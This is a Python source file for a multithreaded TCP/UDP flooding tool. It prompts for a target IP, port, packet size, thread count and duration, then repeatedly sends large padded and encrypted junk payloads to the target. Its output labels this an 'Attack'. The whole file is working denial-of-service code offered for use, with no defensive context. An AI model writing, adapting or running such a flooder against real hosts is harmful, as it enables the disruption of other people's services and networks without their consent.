import socket
import threading
import time
import random
import string
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad

def generate_random_data(size):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=size)).encode()

def encrypt_data(data, key):
    cipher = AES.new(key, AES.MODE_ECB)
    padded_data = pad(data, AES.block_size)
    return cipher.encrypt(padded_data)

def send_tcp_packets(target_ip, target_port, packet_size, num_packets, interval, attack_duration):
    base_data = b'X' * packet_size  # Packet data
    extra_data_2 = b'Z' * packet_size * 20  # Additional packet data 2
    extra_data_3 = b'Y' * packet_size * 10  # Additional packet data 3
    key = generate_random_data(16)  # Generate random 16-byte key for encryption
    extra_data_4 = encrypt_data(generate_random_data(packet_size * 25), key)  # Additional packet data 4

    end_time = time.time() + attack_duration

    while time.time() < end_time:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            s.connect((target_ip, target_port))
            # Combine base data with extra data
            combined_data = base_data + extra_data_2 + extra_data_3 + extra_data_4
            s.sendall(combined_data)
            print("\033[92m[+] TCP Packet sent to", target_ip, "Port:", target_port)
        except socket.error as e:
            print("\033[91m[!] TCP Error occurred:", e)
        finally:
            s.close()
        time.sleep(interval)
    
    print("\033[95m[*] Attack time limit reached. DONE DOWN")

def send_udp_packets(target_ip, target_port, packet_size, num_packets, interval, attack_duration):
    base_data = b'X' * packet_size  # Packet data
    extra_data_2 = b'Z' * packet_size * 20  # Additional packet data 2
    extra_data_3 = b'Y' * packet_size * 10  # Additional packet data 3
    key = generate_random_data(16)  # Generate random 16-byte key for encryption
    extra_data_4 = encrypt_data(generate_random_data(packet_size * 25), key)  # Additional packet data 4

    end_time = time.time() + attack_duration

    while time.time() < end_time:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        try:
            # Combine base data with extra data
            combined_data = base_data + extra_data_2 + extra_data_3 + extra_data_4
            s.sendto(combined_data, (target_ip, target_port))
            print("\033[92m[-] UDP Packet sent to", target_ip, "Port:", target_port)
        except socket.error as e:
            print("\033[91m[!] UDP Error occurred:", e)
        finally:
            s.close()
        time.sleep(interval)
    
    print("\033[95m[*] Attack time limit reached. DONE DOWN")

def main():
    target_ip = input("Enter target IP address: ")
    target_port = int(input("Enter target port: "))
    packet_size = int(input("Enter packet size: "))
    num_packets = int(input("Enter number of packets: "))
    num_threads = int(input("Enter number of threads: "))
    attack_duration = int(input("Enter attack duration (in seconds): "))

    interval = 1  # Send every 1 second

    # Create threads for TCP and UDP attacks
    for _ in range(num_threads):
        # Randomly choose between TCP and UDP for each thread
        if random.choice([True, False]):
            threading.Thread(target=send_tcp_packets, args=(target_ip, target_port, packet_size, num_packets, interval, attack_duration)).start()
        else:
            threading.Thread(target=send_udp_packets, args=(target_ip, target_port, packet_size, num_packets, interval, attack_duration)).start()

if __name__ == "__main__":
    main()
